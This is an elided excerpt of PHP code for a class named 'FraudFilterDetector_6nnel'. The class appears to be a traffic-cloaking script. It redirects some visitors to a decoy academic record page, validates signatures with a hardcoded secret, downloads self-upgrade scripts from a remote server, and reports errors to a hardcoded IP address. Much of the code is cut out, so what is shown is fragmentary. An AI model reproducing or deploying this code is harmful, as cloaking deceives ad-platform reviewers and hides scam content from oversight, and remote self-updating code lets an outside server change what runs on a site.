...
class FraudFilterDetector_6nnel {
    ...
    function isSignatureValid($sign, $time) {
        $str = '90979904-1617-40c5-bd75-d9951c63827a.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://www.econbiz.de/Record/a-solution-of-contract-problem-in-book-trade-supply-chain-systems-based-on-distribution-free-approach-arizono-ikuo/10009655613');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 90979904-1617-40c5-bd75-d9951c63827a',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 90979904-1617-40c5-bd75-d9951c63827a';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 90979904-1617-40c5-bd75-d9951c63827a';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=6nnel&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_6nnel = new FraudFilterDetector_6nnel();
$fraudFilterDetector_6nnel->check();
